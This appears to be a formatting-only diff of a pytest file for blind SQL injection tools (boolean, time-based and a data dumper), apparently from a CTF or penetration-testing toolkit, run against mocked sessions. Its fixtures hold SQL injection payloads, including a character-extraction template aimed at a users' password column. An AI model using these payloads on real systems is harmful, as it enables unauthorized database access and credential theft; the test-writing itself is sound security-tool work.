@@ -29,58 +29,72 @@ class TestBlindSqliBooleanTool:
 
     def test_missing_url(self):
         """Test handling of missing URL."""
-        result = self.tool.use(json.dumps({
-            "method": "GET",
-            "param": "id",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "method": "GET",
+                    "param": "id",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                }
+            )
+        )
         assert "Error" in result
         assert "url" in result.lower()
 
     def test_missing_param(self):
         """Test handling of missing param."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "GET",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                }
+            )
+        )
         assert "Error" in result
         assert "param" in result.lower()
 
     def test_invalid_method(self):
         """Test handling of invalid HTTP method."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "DELETE",
-            "param": "id",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "DELETE",
+                    "param": "id",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                }
+            )
+        )
         assert "Error" in result
         assert "method" in result.lower()
 
     def test_invalid_operation(self):
         """Test handling of invalid operation."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "param": "id",
-            "operation": "invalid_op",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "invalid_op",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                }
+            )
+        )
         assert "Error" in result
         assert "operation" in result.lower()
 
     def test_missing_conditions(self):
         """Test handling of missing true/false conditions."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "param": "id"
-        }))
+        result = self.tool.use(
+            json.dumps({"url": "http://test.com", "method": "GET", "param": "id"})
+        )
         assert "Error" in result
         assert "condition" in result.lower()
 
@@ -158,14 +172,18 @@ class TestBlindSqliBooleanTool:
 
         tool = BlindSqliBooleanTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "operation": "test_condition",
-            "true_condition": "1' AND 1=1 --",
-            "false_condition": "1' AND 1=2 --"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "test_condition",
+                    "true_condition": "1' AND 1=1 --",
+                    "false_condition": "1' AND 1=2 --",
+                }
+            )
+        )
 
         assert "Boolean injection conditions are working" in result
         assert "NEXT STEPS" in result
@@ -183,14 +201,18 @@ class TestBlindSqliBooleanTool:
 
         tool = BlindSqliBooleanTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "operation": "test_condition",
-            "true_condition": "1' AND 1=1 --",
-            "false_condition": "1' AND 1=2 --"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "test_condition",
+                    "true_condition": "1' AND 1=1 --",
+                    "false_condition": "1' AND 1=2 --",
+                }
+            )
+        )
 
         assert "WARNING" in result or "similar" in result.lower()
 
@@ -213,14 +235,18 @@ class TestBlindSqliBooleanTool:
 
         tool = BlindSqliBooleanTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "operation": "extract_char",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "extract_char",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                }
+            )
+        )
 
         assert "Error" in result
         assert "query" in result.lower()
@@ -241,34 +267,38 @@ class TestBlindSqliBooleanTool:
         # We're looking for: ASCII > 79 (False), ASCII > 47 (True), ...
         # Binary search sequence for 65: 79->47->63->71->67->65
         responses = [
-            true_response,   # true baseline
+            true_response,  # true baseline
             false_response,  # false baseline
             # Binary search: start mid = 79, target = 65
             false_response,  # ASCII > 79? FALSE (65 <= 79)
-            true_response,   # ASCII > 55? TRUE (65 > 55)
-            true_response,   # ASCII > 67? FALSE (65 <= 67) - wait, 65 < 67
+            true_response,  # ASCII > 55? TRUE (65 > 55)
+            true_response,  # ASCII > 67? FALSE (65 <= 67) - wait, 65 < 67
             false_response,  # ASCII > 67? FALSE
             false_response,  # ASCII > 61? TRUE (65 > 61)
-            true_response,   # ASCII > 61? TRUE
+            true_response,  # ASCII > 61? TRUE
             false_response,  # ASCII > 64? TRUE (65 > 64)
-            true_response,   # ASCII > 64? TRUE
+            true_response,  # ASCII > 64? TRUE
             false_response,  # ASCII > 65? FALSE (65 == 65)
         ]
         mock_session.get.side_effect = responses
 
         tool = BlindSqliBooleanTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "operation": "extract_char",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --",
-            "query": "SELECT password FROM users LIMIT 1",
-            "position": 1,
-            "payload_template": "' AND (SELECT ASCII(SUBSTRING(({query}),{position},1))>{value}) --"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "extract_char",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                    "query": "SELECT password FROM users LIMIT 1",
+                    "position": 1,
+                    "payload_template": "' AND (SELECT ASCII(SUBSTRING(({query}),{position},1))>{value}) --",
+                }
+            )
+        )
 
         # Should have extracted some character
         assert "Character at position" in result or "RESULT" in result
@@ -292,14 +322,18 @@ class TestBlindSqliBooleanTool:
 
         tool = BlindSqliBooleanTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "operation": "extract_length",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "extract_length",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                }
+            )
+        )
 
         assert "Error" in result
         assert "query" in result.lower()
@@ -322,51 +356,51 @@ class TestBlindSqliTimeTool:
 
     def test_missing_url(self):
         """Test handling of missing URL."""
-        result = self.tool.use(json.dumps({
-            "method": "GET",
-            "param": "id"
-        }))
+        result = self.tool.use(json.dumps({"method": "GET", "param": "id"}))
         assert "Error" in result
         assert "url" in result.lower()
 
     def test_missing_param(self):
         """Test handling of missing param."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET"
-        }))
+        result = self.tool.use(json.dumps({"url": "http://test.com", "method": "GET"}))
         assert "Error" in result
         assert "param" in result.lower()
 
     def test_invalid_method(self):
         """Test handling of invalid HTTP method."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "PATCH",
-            "param": "id"
-        }))
+        result = self.tool.use(
+            json.dumps({"url": "http://test.com", "method": "PATCH", "param": "id"})
+        )
         assert "Error" in result
         assert "method" in result.lower()
 
     def test_invalid_operation(self):
         """Test handling of invalid operation."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "param": "id",
-            "operation": "invalid"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "invalid",
+                }
+            )
+        )
         assert "Error" in result
         assert "operation" in result.lower()
 
     def test_invalid_db_type(self):
         """Test handling of invalid database type."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "param": "id",
-            "db_type": "unknown_db"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "GET",
+                    "param": "id",
+                    "db_type": "unknown_db",
+                }
+            )
+        )
         assert "Error" in result
         assert "db_type" in result.lower()
 
@@ -405,7 +439,7 @@ class TestBlindSqliTimeTool:
 
     # === Detect Operation Tests ===
 
-    @patch('time.time')
+    @patch("time.time")
     def test_detect_finds_time_based_injection(self, mock_time):
         """Test that detect operation finds time-based injection."""
         mock_session = Mock()
@@ -425,19 +459,23 @@ class TestBlindSqliTimeTool:
 
         tool = BlindSqliTimeTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "operation": "detect",
-            "db_type": "mysql",
-            "delay": 3
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "detect",
+                    "db_type": "mysql",
+                    "delay": 3,
+                }
+            )
+        )
 
         assert "Time-Based Blind SQLi" in result
         assert "DETECTED" in result or "3." in result  # Should show timing
 
-    @patch('time.time')
+    @patch("time.time")
     def test_detect_not_found_when_fast(self, mock_time):
         """Test that detect operation reports not found when responses are fast."""
         mock_session = Mock()
@@ -452,14 +490,18 @@ class TestBlindSqliTimeTool:
 
         tool = BlindSqliTimeTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "operation": "detect",
-            "db_type": "mysql",
-            "delay": 3
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "detect",
+                    "db_type": "mysql",
+                    "delay": 3,
+                }
+            )
+        )
 
         assert "NOT detected" in result or "no delay" in result.lower()
 
@@ -467,13 +509,17 @@ class TestBlindSqliTimeTool:
 
     def test_extract_char_missing_query(self):
         """Test that extract_char requires query parameter."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "operation": "extract_char",
-            "db_type": "mysql"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "extract_char",
+                    "db_type": "mysql",
+                }
+            )
+        )
 
         assert "Error" in result
         assert "query" in result.lower()
@@ -482,13 +528,17 @@ class TestBlindSqliTimeTool:
 
     def test_extract_length_missing_query(self):
         """Test that extract_length requires query parameter."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "operation": "extract_length",
-            "db_type": "mysql"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "extract_length",
+                    "db_type": "mysql",
+                }
+            )
+        )
 
         assert "Error" in result
         assert "query" in result.lower()
@@ -511,66 +561,80 @@ class TestSqliDataDumper:
 
     def test_missing_url(self):
         """Test handling of missing URL."""
-        result = self.tool.use(json.dumps({
-            "method": "GET",
-            "param": "id",
-            "query": "SELECT password FROM users"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {"method": "GET", "param": "id", "query": "SELECT password FROM users"}
+            )
+        )
         assert "Error" in result
         assert "url" in result.lower()
 
     def test_missing_param(self):
         """Test handling of missing param."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "query": "SELECT password FROM users"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "GET",
+                    "query": "SELECT password FROM users",
+                }
+            )
+        )
         assert "Error" in result
         assert "param" in result.lower()
 
     def test_missing_query(self):
         """Test handling of missing query."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "param": "id"
-        }))
+        result = self.tool.use(
+            json.dumps({"url": "http://test.com", "method": "GET", "param": "id"})
+        )
         assert "Error" in result
         assert "query" in result.lower()
 
     def test_invalid_method(self):
         """Test handling of invalid HTTP method."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "OPTIONS",
-            "param": "id",
-            "query": "SELECT password FROM users"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "OPTIONS",
+                    "param": "id",
+                    "query": "SELECT password FROM users",
+                }
+            )
+        )
         assert "Error" in result
         assert "method" in result.lower()
 
     def test_invalid_technique(self):
         """Test handling of invalid technique."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "param": "id",
-            "query": "SELECT password FROM users",
-            "technique": "invalid_technique"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "GET",
+                    "param": "id",
+                    "query": "SELECT password FROM users",
+                    "technique": "invalid_technique",
+                }
+            )
+        )
         assert "Error" in result
         assert "technique" in result.lower()
 
     def test_boolean_technique_missing_conditions(self):
         """Test that boolean technique requires conditions."""
-        result = self.tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "param": "id",
-            "query": "SELECT password FROM users",
-            "technique": "boolean"
-        }))
+        result = self.tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "GET",
+                    "param": "id",
+                    "query": "SELECT password FROM users",
+                    "technique": "boolean",
+                }
+            )
+        )
         assert "Error" in result
         assert "condition" in result.lower()
 
@@ -578,14 +642,15 @@ class TestSqliDataDumper:
 
     def test_has_boolean_and_time_tools(self):
         """Test that dumper has both boolean and time tools."""
-        assert hasattr(self.tool, 'boolean_tool')
-        assert hasattr(self.tool, 'time_tool')
+        assert hasattr(self.tool, "boolean_tool")
+        assert hasattr(self.tool, "time_tool")
         assert isinstance(self.tool.boolean_tool, BlindSqliBooleanTool)
         assert isinstance(self.tool.time_tool, BlindSqliTimeTool)
 
     def test_shares_session_with_subttools(self):
         """Test that dumper shares session with sub-tools."""
         import requests
+
         session = requests.Session()
         tool = SqliDataDumper(session=session)
 
@@ -613,19 +678,23 @@ class TestBlindSqliCTFScenarios:
 
         tool = BlindSqliBooleanTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://ctf.challenge.com/user",
-            "method": "GET",
-            "param": "id",
-            "operation": "test_condition",
-            "true_condition": "1' AND 1=1 --",
-            "false_condition": "1' AND 1=2 --"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://ctf.challenge.com/user",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "test_condition",
+                    "true_condition": "1' AND 1=1 --",
+                    "false_condition": "1' AND 1=2 --",
+                }
+            )
+        )
 
         assert "Boolean injection conditions are working" in result
         assert "EXAMPLE PAYLOAD TEMPLATES" in result
 
-    @patch('time.time')
+    @patch("time.time")
     def test_time_based_detection_mysql(self, mock_time):
         """Test time-based injection detection for MySQL."""
         mock_session = Mock()
@@ -640,21 +709,25 @@ class TestBlindSqliCTFScenarios:
 
         tool = BlindSqliTimeTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://ctf.challenge.com/product",
-            "method": "GET",
-            "param": "id",
-            "operation": "detect",
-            "db_type": "mysql",
-            "delay": 5,
-            "prefix": "'",
-            "suffix": " --"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://ctf.challenge.com/product",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "detect",
+                    "db_type": "mysql",
+                    "delay": 5,
+                    "prefix": "'",
+                    "suffix": " --",
+                }
+            )
+        )
 
         assert "mysql" in result.lower() or "MySQL" in result
         assert "SLEEP" in result or "delay" in result.lower()
 
-    @patch('time.time')
+    @patch("time.time")
     def test_time_based_detection_postgresql(self, mock_time):
         """Test time-based injection detection for PostgreSQL."""
         mock_session = Mock()
@@ -669,14 +742,18 @@ class TestBlindSqliCTFScenarios:
 
         tool = BlindSqliTimeTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://ctf.challenge.com/search",
-            "method": "POST",
-            "param": "query",
-            "operation": "detect",
-            "db_type": "postgresql",
-            "delay": 3
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://ctf.challenge.com/search",
+                    "method": "POST",
+                    "param": "query",
+                    "operation": "detect",
+                    "db_type": "postgresql",
+                    "delay": 3,
+                }
+            )
+        )
 
         assert "postgresql" in result.lower() or "PostgreSQL" in result
 
@@ -691,14 +768,18 @@ class TestBlindSqliEdgeCases:
 
         tool = BlindSqliBooleanTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "operation": "test_condition",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "test_condition",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                }
+            )
+        )
 
         assert "Error" in result
 
@@ -714,21 +795,25 @@ class TestBlindSqliEdgeCases:
 
         mock_session.get.side_effect = [
             baseline,
-            requests.exceptions.Timeout("Request timed out")
+            requests.exceptions.Timeout("Request timed out"),
         ]
 
         tool = BlindSqliTimeTool(session=mock_session)
 
-        with patch('time.time', side_effect=[0, 0.1, 0, 15.0]):
-            result = tool.use(json.dumps({
-                "url": "http://test.com/page",
-                "method": "GET",
-                "param": "id",
-                "operation": "detect",
-                "db_type": "mysql",
-                "delay": 5,
-                "timeout": 10
-            }))
+        with patch("time.time", side_effect=[0, 0.1, 0, 15.0]):
+            result = tool.use(
+                json.dumps(
+                    {
+                        "url": "http://test.com/page",
+                        "method": "GET",
+                        "param": "id",
+                        "operation": "detect",
+                        "db_type": "mysql",
+                        "delay": 5,
+                        "timeout": 10,
+                    }
+                )
+            )
 
         # Should detect timeout as potential time-based injection
         assert "timeout" in result.lower() or "DETECTED" in result
@@ -749,15 +834,19 @@ class TestBlindSqliEdgeCases:
 
         tool = BlindSqliBooleanTool(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://test.com/login",
-            "method": "POST",
-            "param": "username",
-            "operation": "test_condition",
-            "true_condition": "admin' AND 1=1 --",
-            "false_condition": "admin' AND 1=2 --",
-            "data": {"password": "test"}
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/login",
+                    "method": "POST",
+                    "param": "username",
+                    "operation": "test_condition",
+                    "true_condition": "admin' AND 1=1 --",
+                    "false_condition": "admin' AND 1=2 --",
+                    "data": {"password": "test"},
+                }
+            )
+        )
 
         assert "Boolean injection conditions are working" in result
         mock_session.post.assert_called()
@@ -775,16 +864,20 @@ class TestBlindSqliEdgeCases:
 
         tool = SqliDataDumper(session=mock_session)
 
-        result = tool.use(json.dumps({
-            "url": "http://test.com/page",
-            "method": "GET",
-            "param": "id",
-            "query": "SELECT password FROM users",
-            "technique": "boolean",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --",
-            "max_length": 10
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/page",
+                    "method": "GET",
+                    "param": "id",
+                    "query": "SELECT password FROM users",
+                    "technique": "boolean",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                    "max_length": 10,
+                }
+            )
+        )
 
         # Should stop early due to indistinguishable responses
         assert "EXTRACTED DATA" in result or "WARNING" in result
@@ -801,15 +894,19 @@ class TestBlindSqliEdgeCases:
 
             tool = BlindSqliTimeTool(session=mock_session)
 
-            with patch('time.time', side_effect=[0, 0.1, 0, 0.1]):
-                result = tool.use(json.dumps({
-                    "url": "http://test.com/page",
-                    "method": "GET",
-                    "param": "id",
-                    "operation": "detect",
-                    "db_type": db_type,
-                    "delay": 3
-                }))
+            with patch("time.time", side_effect=[0, 0.1, 0, 0.1]):
+                result = tool.use(
+                    json.dumps(
+                        {
+                            "url": "http://test.com/page",
+                            "method": "GET",
+                            "param": "id",
+                            "operation": "detect",
+                            "db_type": db_type,
+                            "delay": 3,
+                        }
+                    )
+                )
 
             # Should complete without error
             assert "Time-Based Blind SQLi" in result
@@ -826,6 +923,7 @@ class TestBlindSqliIntegration:
             BlindSqliTimeTool,
             SqliDataDumper,
         )
+
         assert BlindSqliBooleanTool is not None
         assert BlindSqliTimeTool is not None
         assert SqliDataDumper is not None
@@ -835,16 +933,25 @@ class TestBlindSqliIntegration:
         tools = [BlindSqliBooleanTool(), BlindSqliTimeTool(), SqliDataDumper()]
 
         for tool in tools:
-            assert hasattr(tool, 'name'), f"{type(tool).__name__} missing name"
-            assert hasattr(tool, 'description'), f"{type(tool).__name__} missing description"
-            assert hasattr(tool, 'use'), f"{type(tool).__name__} missing use method"
-            assert isinstance(tool.name, str), f"{type(tool).__name__} name not a string"
-            assert isinstance(tool.description, str), f"{type(tool).__name__} description not a string"
-            assert len(tool.description) > 50, f"{type(tool).__name__} description too short"
+            assert hasattr(tool, "name"), f"{type(tool).__name__} missing name"
+            assert hasattr(
+                tool, "description"
+            ), f"{type(tool).__name__} missing description"
+            assert hasattr(tool, "use"), f"{type(tool).__name__} missing use method"
+            assert isinstance(
+                tool.name, str
+            ), f"{type(tool).__name__} name not a string"
+            assert isinstance(
+                tool.description, str
+            ), f"{type(tool).__name__} description not a string"
+            assert (
+                len(tool.description) > 50
+            ), f"{type(tool).__name__} description too short"
 
     def test_tools_share_session_properly(self):
         """Test that tools can share a session."""
         import requests
+
         shared_session = requests.Session()
 
         boolean_tool = BlindSqliBooleanTool(session=shared_session)
@@ -873,7 +980,7 @@ class TestBlindSqliOracleInversion:
         mock_session = MagicMock()
 
         # Responses: true_cond, false_cond, known_true (AND 1=1), known_false (AND 1=2)
-        true_resp = self._mock_response(200, "A" * 100)   # true condition baseline
+        true_resp = self._mock_response(200, "A" * 100)  # true condition baseline
         false_resp = self._mock_response(200, "B" * 200)  # false condition baseline
         # Known-true matches FALSE baseline (inverted!)
         kt_resp = self._mock_response(200, "B" * 200)
@@ -882,15 +989,19 @@ class TestBlindSqliOracleInversion:
         mock_session.get.side_effect = [true_resp, false_resp, kt_resp, kf_resp]
 
         tool = BlindSqliBooleanTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "param": "id",
-            "operation": "test_condition",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --",
-            "detect_oracle_inversion": True,
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "test_condition",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                    "detect_oracle_inversion": True,
+                }
+            )
+        )
 
         assert "INVERTED ORACLE DETECTED" in result
 
@@ -907,15 +1018,19 @@ class TestBlindSqliOracleInversion:
         mock_session.get.side_effect = [true_resp, false_resp, kt_resp, kf_resp]
 
         tool = BlindSqliBooleanTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "param": "id",
-            "operation": "test_condition",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --",
-            "detect_oracle_inversion": True,
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "test_condition",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                    "detect_oracle_inversion": True,
+                }
+            )
+        )
 
         assert "NORMAL" in result or "not inverted" in result.lower()
 
@@ -929,15 +1044,19 @@ class TestBlindSqliOracleInversion:
         mock_session.get.side_effect = [true_resp, false_resp]
 
         tool = BlindSqliBooleanTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com",
-            "method": "GET",
-            "param": "id",
-            "operation": "test_condition",
-            "true_condition": "' AND 1=1 --",
-            "false_condition": "' AND 1=2 --",
-            "detect_oracle_inversion": False,
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com",
+                    "method": "GET",
+                    "param": "id",
+                    "operation": "test_condition",
+                    "true_condition": "' AND 1=1 --",
+                    "false_condition": "' AND 1=2 --",
+                    "detect_oracle_inversion": False,
+                }
+            )
+        )
 
         assert "INVERTED" not in result
         assert "Detecting oracle inversion" not in result
